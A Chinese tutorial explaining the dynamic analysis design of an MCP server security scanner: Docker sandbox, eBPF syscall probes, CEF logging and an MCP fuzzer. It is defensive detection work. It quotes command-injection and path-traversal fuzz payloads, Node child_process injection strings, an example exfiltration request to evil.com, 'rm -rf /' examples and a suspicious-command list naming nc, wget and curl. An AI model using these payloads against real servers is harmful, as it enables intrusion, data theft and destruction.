# MCP-Sec-Audit 动态分析技术深度解读

> 本文档面向安全检测方向的小白，从"为什么要动态分析"开始，逐层深入讲解本项目的动态分析子系统。

---

## 目录

1. [为什么需要动态分析？](#1-为什么需要动态分析)
2. [动态分析相关文件与职责](#2-动态分析相关文件与职责)
3. [动态分析架构总览](#3-动态分析架构总览)
4. [核心概念与专业名词解释](#4-核心概念与专业名词解释)
5. [基础设施层：Docker 沙箱](#5-基础设施层docker-沙箱)
6. [内核监控层：eBPF 探针程序](#6-内核监控层ebpf-探针程序)
7. [用户态监控层：eBPF Monitor](#7-用户态监控层ebpf-monitor)
8. [FUZZ层：MCP Fuzzer](#8-fuzz层mcp-fuzzer)
9. [分析层：行为分析器](#9-分析层行为分析器)
10. [流水线调度层](#10-流水线调度层)
11. [端到端完整流程](#11-端到端完整流程)
12. [动静态结合：两阶段检测](#12-动静态结合两阶段检测)
13. [CEF 日志格式详解](#13-cef-日志格式详解)
14. [安全与性能考量](#14-安全与性能考量)
15. [总结](#15-总结)

---

## 1. 为什么需要动态分析？

### 1.1 静态分析的天花板

静态分析（不运行代码，只看源码）有以下**无法克服的盲区**：

| 盲区 | 举例 | 为什么静态分析搞不定 |
|------|------|---------------------|
| **混淆/编码** | `exec(base64.b64decode("..."))` | 静态分析不知道 base64 解码后的内容是什么 |
| **动态导入** | `__import__(user_input)` | 用户输入决定了导入什么——静态分析无法预判 |
| **运行时行为** | `requests.get(f"http://evil.com/{data}")` | 静态分析只能看到代码，看不到实际网络请求的目标 |
| **间接调用** | `getattr(obj, user_method)()` | 方法名是运行时决定的 |
| **依赖链攻击** | npm 包更新后引入了挖矿脚本 | 只分析直接依赖的源码不够 |

**一句话**：静态分析看到的是"代码能做什么"，动态分析看到的是"代码实际做了什么"。

### 1.2 动态分析解决什么

动态分析**实际运行**目标程序，在运行过程中监控它的行为：

```
静态分析:  源码 → AST → 推测可能的行为
动态分析:  实际运行 → 内核级监控 → 记录真实行为
```

**本项目动态分析的核心能力**：
- 在隔离沙箱中真实运行 MCP 服务器
- 用 eBPF 在内核层面截获所有系统调用
- 用 Fuzzer 自动生成攻击载荷触发潜在危险行为
- 将运行时行为与静态分析结果关联，提升检测置信度

---

## 2. 动态分析相关文件与职责

```
detection/
│
├── detection/detection/pipelines/
│   └── dynamic.py                         # ★ 动态流水线入口 & 两阶段检测调度
│
├── detection/detection/sandbox/
│   ├── runner.py                          # 沙箱抽象协议 (SandboxProvider, SandboxResult)
│   └── providers/
│       └── docker_provider.py             # ★ Docker 沙箱实现（核心基础设施）
│
├── detection/detection/plugins/dynamic/
│   └── __init__.py                        # ★ 行为分析器 (DynamicBehaviorAnalyzer)
│
├── detection/sandbox/                     # 沙箱容器内运行的组件
│   ├── Dockerfile                         # ★ 沙箱镜像定义
│   ├── docker-compose.yml                 # 容器编排配置
│   ├── README.md                          # 沙箱使用文档
│   └── monitors/                          # 容器内执行的监控脚本
│       ├── entrypoint.sh                  # ★ 容器启动入口脚本
│       ├── ebpf_monitor.py                # ★ eBPF 监控器（用户态）
│       ├── bpf_programs.c                 # ★ eBPF 内核探针程序（内核态）
│       └── fuzzer.py                      # ★ MCP Fuzzer（攻击载荷生成器）
│
├── detection/analysis/
│   ├── engine.py                          # 动静态关联入口 (run_ast_analysis_with_dynamic)
│   ├── extractors/dynamic.py              # CEF 日志解析器 (parse_cef_logs)
│   └── passes/dynamic_correlation.py      # ★ 动静态关联分析
│
├── detection/pytest/runner.py             # 自定义测试运行器
└── detection/examples/
    └── dynamic_analysis_demo.py           # 动态分析演示脚本
```

> ★ 标记的是动态分析核心文件。

---

## 3. 动态分析架构总览

### 3.1 整体架构图

```
┌──────────────────────────────────────────────────────────────┐
│                     主机 (Host Machine)                       │
│                                                              │
│  ┌──────────────────────────────────────────────────────┐   │
│  │  检测流水线 (detection/pipelines/dynamic.py)          │   │
│  │                                                      │   │
│  │  ① 读静态分析结果 → 构建 TriggerPlan                  │   │
│  │  ② DockerSandboxProvider.run() 启动沙箱               │   │
│  │  ③ DynamicBehaviorAnalyzer.analyze() 分析日志          │   │
│  │  ④ 合并结果 → DetectionResult                        │   │
│  └──────────────────────────┬───────────────────────────┘   │
│                             │                                │
│                    Docker API 调用                            │
│                             │                                │
│  ┌──────────────────────────▼───────────────────────────┐   │
│  │             Docker 容器 (privileged)                   │   │
│  │                                                      │   │
│  │  Ubuntu 22.04 + BCC + Python 3 + Node.js 20          │   │
│  │                                                      │   │
│  │  ┌─────────────────────────────────────────────┐     │   │
│  │  │  entrypoint.sh                              │     │   │
│  │  │  ① 创建 cgroup 隔离边界                      │     │   │
│  │  │  ② 启动 eBPF Monitor（后台）                 │     │   │
│  │  │  ③ 启动 Fuzzer / 直接执行目标               │     │   │
│  │  │  ④ 等待完成 → 停止 Monitor                   │     │   │
│  │  └─────────────────────────────────────────────┘     │   │
│  │         │                    │                       │   │
│  │         ▼                    ▼                       │   │
│  │  ┌──────────────┐   ┌──────────────┐                │   │
│  │  │ eBPF Monitor │   │ MCP Fuzzer   │                │   │
│  │  │ (用户态Python)│   │ (载荷生成器)  │                │   │
│  │  │              │   │              │                │   │
│  │  │ 读取 perf    │   │ ① 握手 MCP   │                │   │
│  │  │ buffer 获取  │   │ ② 列出工具   │                │   │
│  │  │ 内核事件     │   │ ③ 注入 payload│               │   │
│  │  │              │   │ ④ 调用工具   │                │   │
│  │  │ 格式化为 CEF │   └──────┬───────┘                │   │
│  │  │ 写入日志文件  │          │                        │   │
│  │  └──────┬───────┘          │                        │   │
│  │         │                  ▼                        │   │
│  │         │        ┌──────────────────┐               │   │
│  │         │        │  MCP 目标服务器   │               │   │
│  │         │        │  (被分析的程序)   │               │   │
│  │         │        └────────┬─────────┘               │   │
│  │         │                 │                          │   │
│  │         │         系统调用 (syscall)                  │   │
│  │         ▼                 ▼                          │   │
│  │  ┌─────────────────────────────────────────┐        │   │
│  │  │          Linux Kernel                    │        │   │
│  │  │  ┌───────────────────────────────────┐  │        │   │
│  │  │  │  eBPF 探针 (bpf_programs.c)       │  │        │   │
│  │  │  │  • sys_enter_openat  (文件打开)    │  │        │   │
│  │  │  │  • sys_enter_read    (文件读取)    │  │        │   │
│  │  │  │  • sys_enter_write   (文件写入)    │  │        │   │
│  │  │  │  • sys_enter_unlink  (文件删除)    │  │        │   │
│  │  │  │  • sys_enter_execve  (进程执行)    │  │        │   │
│  │  │  │  • sys_enter_connect (网络连接)    │  │        │   │
│  │  │  │  • sched_process_fork(进程创建)    │  │        │   │
│  │  │  └───────────────────────────────────┘  │        │   │
│  │  └─────────────────────────────────────────┘        │   │
│  └──────────────────────────────────────────────────────┘   │
└──────────────────────────────────────────────────────────────┘
```

### 3.2 数据流向

```
MCP 服务器进程
      │
      │ 调用 open("/etc/passwd", "r")           ← 用户程序发起系统调用
      ▼
Linux Kernel
      │
      │ sys_enter_openat tracepoint 触发          ← 内核层面的拦截点
      ▼
eBPF 探针程序 (bpf_programs.c)
      │
      │ ① is_target() 检查 cgroup id             ← 只拦截目标进程
      │ ② 读取参数: filename, flags
      │ ③ 构造 event_data 结构体
      │ ④ perf_submit → perf buffer              ← 发送到用户态
      ▼
eBPF Monitor (ebpf_monitor.py)                   ← 用户态 Python 程序
      │
      │ ① perf_buffer_poll() 轮询事件
      │ ② _handle_event() 处理事件
      │ ③ 过滤噪声（系统守护进程等）
      │ ④ 提取扩展信息（栈回溯、命令行参数）
      │ ⑤ CEFLogger.log_event() 格式化为 CEF
      │ ⑥ 写入 /logs/events.cef
      ▼
CEF 日志文件 (/logs/events.cef)
      │
      │ Docker 容器退出，日志文件挂载回主机
      ▼
DynamicBehaviorAnalyzer.analyze()
      │
      │ ① parse_cef_logs() 解析 CEF 日志
      │ ② 按事件类型分类（命令执行/文件操作/网络连接）
      │ ③ 生成 CapabilityFinding
      ▼
DetectionResult（与静态结果合并）
```

---

## 4. 核心概念与专业名词解释

### 4.1 eBPF (extended Berkeley Packet Filter)

**一句话解释**：让你能在一个**正在运行的内核**中插入自己的代码，来监控、过滤、修改系统行为——这一切**不需要重启**、**不需要修改内核源码**、**安全的**（内核验证器保证不会崩溃）。

**底层原理**：

```
普通程序想要监控系统调用:
  用户态 → 每次系统调用都要切换到用户态处理 → 性能极差（上下文切换开销）
  
eBPF 监控系统调用:
  用户态 → 加载 eBPF 程序到内核 → 内核在系统调用时直接执行 eBPF 程序 → 零上下文切换
```

eBPF 的完整生命周期：

```
① 编写 eBPF 程序（通常是 C 语言子集）
      │
      ▼
② 编译为 eBPF 字节码（通过 LLVM/Clang）
      │
      ▼
③ 通过 bpf() 系统调用加载到内核
      │
      ▼
④ 内核 verifier 做安全性检查
      │  检查项:
      │  - 是否有无限循环？（必须有界）
      │  - 是否访问非法内存？（全部边界检查）
      │  - 指令数是否超限？（最初 4096 条，现在复���程序可达 100 万条）
      ▼
⑤ JIT 编译为本机指令（可选，但通常会用）
      │
      ▼
⑥ 附加到 hook 点（tracepoint/kprobe/uprobe 等）
      │
      ▼
⑦ 触发时执行 → 通过 perf buffer / ring buffer / BPF map 与用户态通信
```

**本项目用 eBPF 做什么**：监控目标进程的所有系统调用——打开什么文件、执行什么命令、连接什么网络地址。

### 4.2 Tracepoint（跟踪点）

**定义**：Linux 内核源码中预埋的静态探测点。内核开发者在内核的关键路径上手动放置的"标记"。

```
内核源码中的 tracepoint 定义示例:
  TRACE_EVENT(sys_enter_openat,
      TP_PROTO(int dfd, const char __user *filename, int flags, umode_t mode),
      ...
  );

这个 tracepoint 在每次系统调用 openat() 进入时触发。
```

**为什么本项目用 tracepoint 而非 kprobe？**
- Tracepoint 是内核 ABI 的一部分，跨版本稳定
- Kprobe 依赖内核内部函数名，不同内核版本可能变化
- Tracepoint 有明确定义的参数结构，编程更安全

### 4.3 BCC (BPF Compiler Collection)

**定义**：一套工具和库，让编写 eBPF 程序变得简单。最关键的是：它允许你**在 Python 中嵌入 C 语言的 eBPF 代码字符串**，BCC 在运行时帮你编译和加载。

```python
from bcc import BPF

bpf_code = """
int hello(void *ctx) {
    bpf_trace_printk("Hello, eBPF!\\n");
    return 0;
}
"""

b = BPF(text=bpf_code)                              # 编译 + 加载
b.attach_kprobe(event="__x64_sys_clone", fn_name="hello")  # 附加到 hook 点
```

本项目就是通过 BCC 的 `BPF(text=bpf_code)` 来加载 `bpf_programs.c` 的。

### 4.4 Cgroup (Control Group)

**定义**：Linux 内核的资源隔离机制，可以限制、记账、隔离一组进程的 CPU、内存、IO 等资源使用。

在本项目中，cgroup 的**关键用途不是资源限制，而是进程识别**：

```
问题: 在容器中同时运行 Monitor 和 被测试的 MCP 服务器
      → eBPF 如何区分"哪些系统调用来自被测试进程"？

解决: ① 创建专用 cgroup: /sys/fs/cgroup/mcp-target
      ② 将被测试进程放入该 cgroup
      ③ eBPF 程序中通过 bpf_get_current_cgroup_id() 获取当前进程的 cgroup id
      ④ 只处理 cgroup id 匹配的进程的事件
```

这就是 `bpf_programs.c` 中 `is_target()` 函数的原理。

### 4.5 Perf Buffer (性能事件缓冲区)

**定义**：内核和用户态之间的共享内存环形缓冲区，用于高效传输事件数据。

```
内核态 eBPF 程序:
  event_data event = {...};           // 构造事件
  events.perf_submit(ctx, &event, sizeof(event));  // 发送到 perf buffer

用户态 Python 程序:
  bpf["events"].open_perf_buffer(callback)   // 打开并注册回调
  bpf.perf_buffer_poll(timeout=100)          // 轮询（阻塞等待事件）
```

**为什么用它**：这是内核态到用户态的**最高效通信方式**——批处理、零拷贝、支持多 CPU 并发写入。

### 4.6 Fuzzing（模糊测试）

**定义**：向程序输入大量随机/半随机/精心构造的异常数据，观察程序是否出现崩溃、异常行为或安全漏洞。

在本项目中的 Fuzzing 是**针对 MCP 协议的专用 Fuzz**：

```
不是随机生成字节，而是:
① 通过 MCP 协议与目标服务器握手
② 列出所有可用工具（tools/list）
③ 对每个工具的每个字符串参数，注入攻击载荷
④ 观察运行时的系统调用行为
```

这种方式比随机 Fuzzign 更精准——它知道每个工具的"输入面"是什么。

### 4.7 Payload（攻击载荷）

**定义**：安全测试中用来触发漏洞的输入数据。

```python
# 本项目 Fuzzer 使用的 payload 示例:
payloads = [
    "../../../etc/passwd",      # 路径遍历——尝试读取系统敏感文件
    "; id",                      # 命令注入——尝试在 shell 中注入额外命令
    "$(id)",                     # shell 变量展开注入
    "| id",                      # 管道注入
    "`id`",                      # 反引号命令替换注入
    "require('child_process').execSync('id').toString()",  # JS 代码注入
]
```

### 4.8 CEF (Common Event Format, 通用事件格式)

**定义**：ArcSight 公司提出的安全事件日志标准格式，目前被几乎所有 SIEM 产品支持。

格式：`CEF:Version|Vendor|Product|Version|SignatureID|Name|Severity|Extension`

```
示例:
CEF:0|MCP-Security|Dynamic-Detector|1.0|FILE_READ|Sensitive File Access|9|
     rt=2025-01-20T10:15:23.456 suser=root sproc=python spid=1234 
     dst=/etc/passwd act=read outcome=success bytesIn=2048
```

本项目输出 CEF 格式是因为它**结构化、行业标准、便于后续接入 SIEM 系统**。

### 4.9 Ustack（用户态栈回溯）

**定义**：记录事件发生时，用户态程序的函数调用栈。

```
当 subprocess.run("rm -rf /") 被调用时:

ustack 记录:
  0x7f...  subprocess.run          ← 最上层
  0x7f...  run_command             ← MCP 入口函数
  0x7f...  fuzzer.py:call_tool     ← Fuzzer 调用的
```

**为什么重要**：栈回溯能证明"是谁触发了这个危险操作"——这对于后续的动静态关联（把运行时事件关联回静态分析中发现的 Sink）至关重要。

### 4.10 Docker 特权模式 (Privileged Mode)

**定义**：Docker 的 `--privileged` 标志赋予容器几乎等同于宿主机的权限。

**为什么本项目需要**：
- eBPF 程序的加载需要 `CAP_SYS_ADMIN` 能力
- 挂载 debugfs（`/sys/kernel/debug`）需要特权
- 读取 `/proc/<pid>/cmdline` 等需要 `CAP_SYS_PTRACE`

**安全措施**：沙箱只能在对安全可控的机器上使用（见 §14）。

### 4.11 MCP 协议 (Model Context Protocol)

在动态分析的上下文中，MCP 协议的具体细节很重要：

```
MCP 使用 JSON-RPC 2.0 协议，基于 stdio 传输:

客户端 (Fuzzer)                 服务端 (被测试的 MCP 服务器)
     │                                    │
     │──→ {"jsonrpc":"2.0","id":1,        │
     │     "method":"initialize",...}      │
     │                                    │──→ 初始化响应
     │←── {"jsonrpc":"2.0","id":1,        │
     │     "result":{...}}                │
     │                                    │
     │──→ {"jsonrpc":"2.0","method":      │
     │     "notifications/initialized"}    │
     │                                    │
     │──→ {"jsonrpc":"2.0","id":2,        │
     │     "method":"tools/list"}          │
     │                                    │──→ 返回工具列表
     │←── {"jsonrpc":"2.0","id":2,        │
     │     "result":{"tools":[...]}}      │
     │                                    │
     │──→ {"jsonrpc":"2.0","id":3,        │
     │     "method":"tools/call",          │
     │     "params":{"name":"exec_cmd",    │
     │      "arguments":{"cmd":"; id"}}}  │  ← 注入攻击载荷!
     │                                    │──→ 执行系统调用...被 eBPF 捕获
```

---

## 5. 基础设施层：Docker 沙箱

**文件位置**: `detection/detection/sandbox/providers/docker_provider.py`

### 5.1 抽象协议

系统通过 `SandboxProvider` 协议实现了沙箱的抽象：

```python
class SandboxProvider(Protocol):
    name: str
    def run(self, target_path, *, timeout=60, execution_mode="mcp_fuzz") -> SandboxResult:
        ...

@dataclass
class SandboxResult:
    logs: str                          # CEF 日志 + 容器输出
    telemetry: Mapping[str, object]    # 统计数据（事件数、敏感路径等）
    exit_code: int                     # 容器退出码
    execution_mode: str                # "mcp_fuzz" 或 "direct_exec"
```

### 5.2 DockerSandboxProvider 核心流程

```python
class DockerSandboxProvider:
    def run(self, target_path, *, timeout=60, execution_mode="mcp_fuzz"):
        # 步骤 1: 创建临时目录
        with tempfile.TemporaryDirectory() as temp_dir:
            target_mount = temp_dir / "target"
            logs_mount = temp_dir / "logs"

            # 步骤 2: 复制目标代码到挂载点
            shutil.copytree(target_path, target_mount)

            # 步骤 3: 配置容器挂载
            mounts = [
                Mount(target="/target", source=target_mount, type="bind"),  # 目标代码
                Mount(target="/logs",   source=logs_mount,   type="bind"),  # 日志输出
                Mount(target="/monitor", source=monitors_dir, type="bind"),  # 监控脚本
            ]

            # 步骤 4: 配置容器参数
            container_config = {
                "image": "mcp-security-sandbox:latest",
                "privileged": True,       # ★ eBPF 必须是特权模式
                "pid_mode": "host",       # ★ 共享 PID 命名空间（eBPF PID 一致性）
                "cap_add": ["SYS_ADMIN", "SYS_RESOURCE", "SYS_PTRACE", "NET_ADMIN"],
                "environment": {
                    "MONITOR_TIMEOUT": str(timeout),
                    "MODE": execution_mode,  # "mcp_fuzz" 或 "direct_exec"
                },
                ...
            }

            # 步骤 5: 启动容器
            container = self.client.containers.run(**container_config)

            # 步骤 6: 等待完成
            result = container.wait(timeout=timeout + 10)

            # 步骤 7: 收集日志
            cef_content = (logs_mount / "events.cef").read_text()

            # 步骤 8: 解析遥测数据
            telemetry = self._parse_cef_logs(cef_content)
```

### 5.3 资源限制

```python
resource_limits = {
    "cpu_period": 100000,    # CPU 调度周期（微秒）
    "cpu_quota": 200000,     # 每周期可用 CPU 时间 = 2 个 CPU 核心
    "mem_limit": "2g",       # 最大 2GB 内存
    "pids_limit": 512,       # 最大 512 个进程——防止 fork 炸弹
}
```

### 5.4 遥测解析

容器退出后，`_parse_cef_logs()` 统计 CEF 日志中的事件：

```python
def _parse_cef_logs(self, cef_logs):
    # 对每行 CEF 日志:
    #   如果包含 "FILE_" → file_events++
    #   如果包含 "NET_"  → network_events++
    #   如果包含 "PROC_" → process_events++
    #   如果是 PROC_EXEC → 提取命令（过滤掉 /python3、/node 等噪声）

    # 同时收集:
    #   - 敏感路径（/etc/passwd, /.ssh, /.aws 等）
    #   - 网络目标地址
    #   - 执行的命令

    return {
        "total_events": 150,
        "file_events": 45,
        "network_events": 3,
        "process_events": 12,
        "command_executions": 4,
        "sensitive_paths": ["/etc/passwd"],
        "network_destinations": ["8.8.8.8:443"],
        "executed_commands": ["/bin/bash", "/usr/bin/wget"],
    }
```

---

## 6. 内核监控层：eBPF 探针程序

**文件位置**: `detection/sandbox/monitors/bpf_programs.c`

### 6.1 整体设计

这个 C 程序运行在**内核态**，通过 BCC 框架加载。共监控 7 个系统调用：

| 探针 | 监控的系统调用 | 触发条件 | 捕获的恶意行为 |
|------|---------------|----------|---------------|
| `sys_enter_openat` + `sys_exit_openat` | `openat()` | 打开文件 | 读取敏感文件、配置文件 |
| `sys_enter_read` | `read()` | 读取已打开的文件 | 读取敏感文件内容 |
| `sys_enter_write` | `write()` | 写入已打开的文件 | 篡改文件、植入后门 |
| `sys_enter_unlinkat` | `unlinkat()` | 删除文件 | 删除日志、销毁证据 |
| `sys_enter_execve` | `execve()` | 执行新进程 | 命令注入、反弹 shell |
| `sys_enter_connect` | `connect()` | 建立网络连接 | 数据外泄、C2 通信 |
| `sched_process_fork` | `fork()`/`clone()` | 创建子进程 | fork 炸弹、进程繁殖 |

### 6.2 Cgroup 边界过滤 — Is_Target()

这是整个 eBPF 程序最关键的函数——**只监控目标进程**：

```c
// 存放目标 cgroup inode id（由 entrypoint.sh 在启动时设置）
BPF_ARRAY(target_cgroup_id, u64, 1);

// 判断当前进程是否属于目标 cgroup
static inline bool is_target() {
    u32 key = 0;
    u64 *val = target_cgroup_id.lookup(&key);
    if (val == NULL || *val == 0) return false;
    return bpf_get_current_cgroup_id() == *val;  // ★ 关键: 比较 cgroup id
}
```

**为什么用 cgroup id 而不是 PID？**
- PID 在容器内外可能不一致（用户命名空间）
- 被测试进程可能 fork 子进程——子进程继承了 cgroup 但 PID 变了
- cgroup id 是内核级别的稳定标识

### 6.3 文件操作监控 — 以 openat 为例

```c
// 步骤 1: 函数进入时——记录参数
TRACEPOINT_PROBE(syscalls, sys_enter_openat) {
    if (!is_target()) return 0;         // ★ 只监控目标进程

    // 读取系统调用的参数: filename, flags
    bpf_probe_read_user_str(args_data->fname, sizeof(args_data->fname), args->filename);
    args_data->flags = args->flags;

    // 保存到临时表（用线程 ID 作 key）——等待 sys_exit_openat 时读取
    active_opens.update(&tid, args_data);
    return 0;
}

// 步骤 2: 函数返回时——获取结果并上报
TRACEPOINT_PROBE(syscalls, sys_exit_openat) {
    if (!is_target()) return 0;

    // 读取之前保存的参数
    struct open_args_t *saved_args = active_opens.lookup(&tid);

    int ret_fd = args->ret;            // 返回值 = 文件描述符
    if (ret_fd >= 0) {                 // 打开成功
        // ★ 在 fd_info 表中建立 FD → 文件名 映射
        //   这样后续的 read()/write() 可以通过 FD 查到对应的文件名
        u64 key = ((u64)pid << 32) | (u32)ret_fd;
        fd_info.update(&key, info);

        // 构造并发送事件
        struct event_data *event = event_heap.lookup(&zero);
        event->event_type = EVENT_FILE_OPEN;
        event->pid = get_curr_pid();
        event->fd = ret_fd;
        event->flags = saved_args->flags;
        event->stack_id = stack_traces.get_stackid(args, BPF_F_USER_STACK); // ★ 用户态栈回溯
        events.perf_submit(args, event, sizeof(*event));                    // ★ 发送到用户态
    }
    active_opens.delete(&tid);
    return 0;
}
```

### 6.4 FD → 文件名 映射机制

一个关键设计：`read()`/`write()` 只能看到**文件描述符（整数）**，看不到文件名。所以需要在 `openat()` 时建立映射：

```
时间线:
  T1: openat("/etc/passwd", O_RDONLY) → 返回 fd=3
      fd_info 表: (pid:1234, fd:3) → "/etc/passwd"

  T2: read(3, buf, 1024)
      查 fd_info 表: (pid:1234, fd:3) → "/etc/passwd"
      事件报告: FILE_READ, pid=1234, path="/etc/passwd"

  T3: close(3)
      删除 fd_info 表项: (pid:1234, fd:3)
```

映射 Key 的构成：
```c
u64 key = ((u64)pid << 32) | (u32)fd;
//       高 32 位 = PID      低 32 位 = 文件描述符
// 这样不同进程的 fd=3 不会冲突
```

### 6.5 execve 监控

```c
TRACEPOINT_PROBE(syscalls, sys_enter_execve) {
    if (!is_target()) return 0;

    struct event_data *event = event_heap.lookup(&zero);
    event->event_type = EVENT_PROC_EXEC;
    event->pid = get_curr_pid();
    bpf_probe_read_user_str(event->path, sizeof(event->path), args->filename);
    // args->filename 就是要执行的程序路径（如 "/bin/bash"）

    event->stack_id = stack_traces.get_stackid(args, BPF_F_USER_STACK);
    events.perf_submit(args, event, sizeof(*event));
}
```

### 6.6 connect 监控

```c
TRACEPOINT_PROBE(syscalls, sys_enter_connect) {
    // 读取 socket 地址
    struct sockaddr *uaddr = (struct sockaddr *)args->uservaddr;
    short family;
    bpf_probe_read_user(&family, sizeof(family), &uaddr->sa_family);

    if (family == AF_INET) {           // IPv4
        struct sockaddr_in sin = {};
        bpf_probe_read_user(&sin, sizeof(sin), uaddr);
        event->port = __builtin_bswap16(sin.sin_port);  // 网络字节序 → 主机字节序
        __builtin_memcpy(event->ip, &sin.sin_addr, 4);   // 复制 IP 地址
    } else if (family == AF_INET6) {   // IPv6
        ...
    } else if (family == AF_UNIX) {    // Unix Domain Socket
        // 读取 socket 文件路径
        bpf_probe_read_user_str(event->path, sizeof(event->path), sun.sun_path);
    }
}
```

---

## 7. 用户态监控层：eBPF Monitor

**文件位置**: `detection/sandbox/monitors/ebpf_monitor.py`

### 7.1 核心类：EBPFMonitor

```python
class eBPFMonitor:
    def __init__(self):
        # ① 重命名当前进程（避免监控到自己的事件）
        libc.prctl(15, b"ebpf-monitor", 0, 0, 0)

        # ② 加载 eBPF 程序
        with open("bpf_programs.c") as f:
            bpf_code = f.read()
        self.bpf = BPF(text=bpf_code)            # BCC 编译 + 加载

        # ③ 设置目标 cgroup id（从环境变量读取）
        target_cgroup_map = self.bpf["target_cgroup_id"]
        target_cgroup_map[c_uint32(0)] = c_uint64(cgroup_id)

        # ④ 打开 perf buffer
        self.bpf["events"].open_perf_buffer(self._handle_event)

    def run(self, timeout=30):
        end_time = time.time() + timeout
        while time.time() < end_time:
            self.bpf.perf_buffer_poll(timeout=100)   # 每 100ms 轮询一次
```

### 7.2 事件处理与噪声过滤

```python
def _handle_event(self, cpu, data, size):
    event = self.bpf["events"].event(data)

    # 过滤 1: 跳过监控器自己的事件
    if event.pid == self._monitor_pid:
        return

    # 过滤 2: 跳过系统噪声
    if comm in ["systemd-udevd", "systemd-journal", "dockerd", "containerd"]:
        return

    # 过滤 3: 文件操作噪声
    if event_type in ["FILE_OPEN", "FILE_READ", ...]:
        # 忽略标准系统路径（/proc/, /sys/, /usr/lib/, /lib/ 等）
        if path.startswith("/proc/") or path.startswith("/sys/"):
            # 但是！敏感路径除外
            if not any(s in path for s in SENSITIVE_PATHS):
                return
```

### 7.3 扩展信息收集

```python
# 收集用户态栈回溯
if event.stack_id >= 0:
    addrs = self.bpf["stack_traces"].get_stack(stack_id)
    for addr in addrs:
        frames.append(f"0x{addr:x}")            # 十六进制地址，可离线用 addr2line 解析

# 读取进程的完整命令行参数
def _read_proc_cmdline(self, pid):
    with open(f"/proc/{pid}/cmdline", "rb") as f:
        raw = f.read()
    args = raw.split(b"\x00")                  # cmdline 用 null 字节分隔参数
    return " ".join(args)
```

### 7.4 严重度动态增强

```python
# 基础严重度表
SEVERITY_MAP = {
    "PROC_EXEC": 8,      # 命令执行 = 高严重度
    "FILE_UNLINK": 8,    # 删除文件 = 高严重度
    "NET_CONNECT": 7,    # 网络连接 = 中高严重度
    ...
}

# 动态增强: 访问敏感路径 → 严重度 +3
SENSITIVE_PATHS = ["/etc/passwd", "/etc/shadow", "/root/.ssh", "/.env"]
if any(sensitive in path for sensitive in SENSITIVE_PATHS):
    severity = min(10, severity + 3)

# 动态增强: 执行可疑命令 → 严重度 +2
SUSPICIOUS_COMMANDS = ["bash", "sh", "nc", "wget", "curl", "chmod"]
if any(cmd in command for cmd in SUSPICIOUS_COMMANDS):
    severity = min(10, severity + 2)
```

### 7.5 CEF 日志输出

```python
class CEFLogger:
    def log_event(self, event_type, data, extensions):
        severity = SEVERITY_MAP.get(event_type, 5)
        # 增强严重度（如果涉及敏感路径或可疑命令）
        ...

        # 格式化 CEF 消息:
        cef = f"CEF:{VERSION}|{VENDOR}|{PRODUCT}|{VER}|{event_type}|{name}|{severity}"
        extensions_str = " ".join(f"{k}={v}" for k, v in extensions.items())
        cef_message = f"{cef}|{extensions_str}"

        self.file_handle.write(cef_message + "\n")
```

---

## 8. Fuzz层：MCP Fuzzer

**文件位置**: `detection/sandbox/monitors/fuzzer.py`

### 8.1 核心思想

MCP Fuzzer **不是**盲目注入随机数据，而是**理解 MCP 协议的结构**，针对性地向每个工具的字符串参数注入攻击载荷。

### 8.2 完整流程

```
阶段 1: 启动目标服务器
      MCAFuzzer.start()
        └→ subprocess.Popen(target_command, stdin=PIPE, stdout=PIPE)
           同时在 preexec_fn 中将进程放入目标 cgroup

阶段 2: MCP 握手
      ① 发送 initialize 请求
      ② 等待 initialize 响应
      ③ 发送 notifications/initialized（告知服务器已就绪）

阶段 3: 工具发现
      ① 发送 tools/list 请求
      ② 解析响应中的 tools 数组
      ③ 获取每个工具的名称和 inputSchema

阶段 4: Fuzz 循环（核心）
      for tool in tools:
          for prop_name in tool.inputSchema.properties:
              if prop_def.type == "string":
                  for payload in PAYLOADS:
                      args = base_args.copy()
                      args[prop_name] = payload              # ★ 注入攻击载荷
                      send_request("tools/call",
                          {"name": tool_name, "arguments": args})
```

### 8.3 攻击载荷

```python
payloads = [
    # ── 路径遍历 ──
    "../../../etc/passwd",          # 尝试读取系统密码文件
    "/etc/shadow",                  # 尝试读取影子密码文件

    # ── 命令注入（Shell 元字符）──
    "; id",                         # 分号 + 命令
    "$(id)",                        # 命令替换
    "| id",                         # 管道
    "`id`",                         # 反引号命令替换

    # ── Node.js 代码注入 ──
    "require('child_process').execSync('id').toString()",
    "process.mainModule.require('child_process').execSync('id').toString()",
    "(function(){ return require('child_process').execSync('id').toString(); })()",
    "require('fs').readFileSync('/etc/passwd').toString()",

    # ── ESM 异步代码注入 ──
    "(async function(){ (await import('child_process')).execSync('id') })()",
    "import('child_process').then(cp => cp.execSync('id'))",
]
```

**Payload 选择逻辑**：
- `../../../etc/passwd` 测试**路径遍历漏洞**——如果工具用传入的文件名拼接路径，可能越权读到系统文件
- `; id` 测试**命令注入漏洞**——如果工具把参数拼接到 shell 命令中
- `require('child_process')` 测试 **JS 代码注入**——如果工具用 `eval()` 执行传入的代码

### 8.4 Fuzzer 与 eBPF 的协作

这是本系统设计的精妙之处——**Fuzzer 和 Monitor 在同一容器内并行运行**：

```
Fuzzer:            "试试这个 payload → ; rm -rf /"
                        ↓
MCP 服务器:        收到参数，执行 subprocess.run(user_input, shell=True)
                        ↓
Linux 内核:        execve("/bin/bash", ["bash", "-c", "rm -rf /"])
                        ↓
eBPF 探针:         触发 sys_enter_execve → 捕获! 构造事件 → perf_submit
                        ↓
eBPF Monitor:      perf_buffer_poll → 读取事件 → 格式化 CEF 日志
```

---

## 9. 分析层：行为分析器

**文件位置**: `detection/detection/plugins/dynamic/__init__.py`

### 9.1 CEF 事件解析

```python
class CEFEvent:
    """从一行 CEF 日志解析出结构化事件"""

    @classmethod
    def parse(cls, cef_line):
        # "CEF:0|MCP-Security|Dynamic-Detector|1.0|PROC_EXEC|...|7|rt=... spid=1234 dproc=bash"
        parts = cef_line.split("|")
        signature_id = parts[4]          # "PROC_EXEC"
        severity = int(parts[6])         # 7
        extensions = parse_extensions(parts[7])  # {rt: ..., spid: "1234", dproc: "bash"}
        return CEFEvent(signature_id, severity, extensions)
```

### 9.2 行为分析

```python
class DynamicBehaviorAnalyzer:
    def analyze(self, cef_logs, target_path):
        events = [CEFEvent.parse(line) for line in cef_logs.splitlines()]

        findings = []

        # ① 命令执行检测
        exec_events = [e for e in events if e.signature_id == "PROC_EXEC"]
        if exec_events:
            commands = {e.extensions["dproc"] for e in exec_events}
            confidence = min(0.95, 0.60 + len(commands) * 0.1)
            #   1 个命令 = 0.70,  2 个 = 0.80,  3 个 = 0.90
            findings.append(CapabilityFinding(
